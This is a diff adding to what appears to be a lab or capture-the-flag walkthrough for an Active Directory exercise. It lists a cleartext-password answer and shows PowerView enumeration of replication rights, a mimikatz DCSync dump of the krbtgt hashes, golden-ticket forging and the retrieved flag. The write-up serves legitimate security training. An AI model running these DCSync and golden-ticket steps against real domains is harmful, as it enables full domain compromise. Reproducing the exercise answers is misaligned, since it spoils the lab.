@@ -273,3 +273,233 @@ NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791
 6- **Submit this user's cleartext password.**
 
 > Answer:Sup3rS3cur3D0m@inU2eR
+
+7- ****
+
+```c
+PS C:\> Get-DomainUser -Identity tpetty  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+
+samaccountname     : tpetty
+objectsid          : S-1-5-21-2270287766-1317258649-2146029398-4607
+memberof           :
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+
+
+
+PS C:\> $sid= "S-1-5-21-2270287766-1317258649-2146029398-4607"
+PS C:\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
+ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
+ObjectAceType         : DS-Replication-Get-Changes
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
+ObjectAceType         : DS-Replication-Get-Changes-All
+```
+
+
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 3/30/2022 3:54:28 AM
+Object Security ID   : S-1-5-21-2270287766-1317258649-2146029398-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 6dbd63f4a0e7c8b221d61f265c4a08a7
+    ntlm- 0: 6dbd63f4a0e7c8b221d61f265c4a08a7
+    lm  - 0: 71f5354fb6fbe151714f6721f59011dd
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6fde235c8619e8c5c87e14f2b17552d7
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : INLANEFREIGHT.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 7a2c7787775bdf8b34c52a1d0f387a3d6201752ed30033d178421e7f0d7b1fe8
+      aes128_hmac       (4096) : ea3a44ad8f9b7429f8b878b41b6362ff
+      des_cbc_md5       (4096) : 5485514919f4ce7c
+
+* Primary:Kerberos *
+    Default Salt : INLANEFREIGHT.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 5485514919f4ce7c
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  2bb73bdf286535cca8381b1afb78b82d
+    02  3b04c50704a81e6cc5125379207ffdc2
+    03  2ca377dbfde6edef8e9d2a5c17b71e73
+    04  2bb73bdf286535cca8381b1afb78b82d
+    05  3b04c50704a81e6cc5125379207ffdc2
+    06  937d38336fd33b931ff6f106c54a76a4
+    07  2bb73bdf286535cca8381b1afb78b82d
+    08  7a69e7697b6df4a0040bb36171a0e08e
+    09  cc399ef2a6502a37f9124416f616dfd5
+    10  044537a6bef7c6115fbb5842cd47be4e
+    11  7a69e7697b6df4a0040bb36171a0e08e
+    12  cc399ef2a6502a37f9124416f616dfd5
+    13  f843a1cdec578e2ead903cb9f80073d8
+    14  7a69e7697b6df4a0040bb36171a0e08e
+    15  c3cb5c0aa3ebccfb636861ec22ac237c
+    16  2592019b4fc371efae925414173e3b69
+    17  5be090a16765c728f0b08f9a9a057012
+    18  6d6b885f818a372547456fca4f974b98
+    19  45b5004e455663288b5c6184d192d001
+    20  7bc20dc9ecfc249ecb224fa27bbd85ce
+    21  66406595b499152a9df7614d539e7a2e
+    22  66406595b499152a9df7614d539e7a2e
+    23  06734969c3b71aaee2e401062dfd96c3
+    24  fca233890eccb4232a3f3331d47f1621
+    25  8d45e2dd76d2df2e8be12cbddffb47e2
+    26  21c8885ffb2a003ef6dbcbdcb65217b8
+    27  868395f3f5a7dcc5d2f9ac454ea99d21
+    28  58705a0138014a18c509951e3e53babd
+    29  9ffa2d0920441c7b8ea25cc4ff686f4c
+
+
+
+PS C:\> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+distinguishedname                                       objectsid
+-----------------                                       ---------
+CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-2270287766-1317258649-2146029398-519
+
+
+mimikatz # kerberos::golden /User:johnny /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2270287766-1317258649-2146029398 /krbtgt:6dbd63f4a0e7c8b221d61f265c4a08a7 /id:500 /ptt
+User      : hacker
+Domain    : INLANEFREIGHT.LOCAL (INLANEFREIGHT)
+SID       : S-1-5-21-2270287766-1317258649-2146029398
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 6dbd63f4a0e7c8b221d61f265c4a08a7 - rc4_hmac_nt
+Lifetime  : 3/27/2025 11:38:08 AM ; 3/25/2035 11:38:08 AM ; 3/25/2035 11:38:08 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'johnny @ INLANEFREIGHT.LOCAL' successfully submitted for current session
+
+mimikatz # exit
+Bye!
+PS C:\> type \\dc01\c$\Users\Administrator\Desktop\flag.txt
+r3plicat1on_m@st3r!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
